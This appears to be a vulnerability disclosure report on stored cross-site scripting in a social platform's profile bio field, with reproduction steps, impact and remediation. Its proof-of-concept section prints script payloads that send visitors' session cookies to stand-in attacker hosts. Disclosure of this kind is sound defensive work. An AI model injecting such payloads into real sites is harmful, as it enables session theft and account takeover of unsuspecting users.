# Title: Stored Cross-Site Scripting in User Profile Bio Field

- **Platform**: Cobalt
- **Program**: Social Networking Platform
- **Severity**: High
- **Date**: March 2025
- **Researcher**: Cobalt Core Pentester (anonymous)
- **Bounty**: $1,800

## Summary

A stored Cross-Site Scripting (XSS) vulnerability was identified in the user profile bio field of a social networking platform during a Cobalt pentest. The application failed to properly sanitize HTML/JavaScript content in user bio fields before rendering them on profile pages. This allowed an attacker to inject persistent JavaScript payloads that would execute whenever another user viewed the attacker's profile.

## Technical Details

The profile bio field accepted rich text input and used a WYSIWYG editor on the client side. While the client-side editor applied some sanitization, the server-side API endpoint that accepted bio updates did not validate or sanitize the HTML content before storing it in the database. When another user viewed the profile, the bio content was served as HTML and rendered in the browser without proper encoding.

The application used an API endpoint to update profile information:

```http
PUT /api/v1/profile
Content-Type: application/json

{
  "bio": "<script>/* malicious code */</script>"
}
```

The server stored the bio field as-is and served it in the profile page response:

```html
<div class="profile-bio">
  <script>/* malicious code */</script>
</div>
```

## Steps to Reproduce

1. Register an account on the platform
2. Navigate to the profile settings / edit profile page
3. Intercept the profile update request using Burp Suite
4. Replace the bio field value with a JavaScript payload
5. Submit the request
6. Navigate to the public profile page in a different browser or incognito window (simulating another user)
7. Observe that the JavaScript payload executes

## Proof of Concept

Payload used to demonstrate cookie exfiltration:

```html
<script>
var img = new Image();
img.src = 'https://attacker-controlled-server.com/steal?cookie=' + encodeURIComponent(document.cookie);
</script>
```

The full request:

```http
PUT /api/v1/profile HTTP/1.1
Host: social.target.com
Authorization: Bearer [session_token]
Content-Type: application/json

{
  "display_name": "Security Researcher",
  "bio": "<script>fetch('https://attacker.net/exfil?c='+document.cookie)</script>",
  "location": "Somewhere"
}
```

The payload executed immediately when any user viewed the profile. A blind XSS payload was also tested, confirming that the payload fired for all profile visitors including platform administrators.

## Impact

- Persistent JavaScript execution in the context of any user viewing the attacker's profile
- Theft of session cookies leading to account takeover
- Defacement of profile pages
- Redirection to malicious phishing sites
- In the case of administrative users viewing the profile, potential for complete platform compromise via admin session theft

## Remediation

- Implement server-side HTML sanitization using a well-maintained library (e.g., DOMPurify on the server or OWASP Java HTML Sanitizer)
- Apply Content Security Policy (CSP) headers to restrict script execution
- Encode user-supplied data on output using contextual escaping
- Validate that the bio field contains only safe content (plain text or restricted Markdown)
- Reject requests containing script tags or event handlers on the server side

## References
- https://www.cobalt.io/vulnerability-wiki/
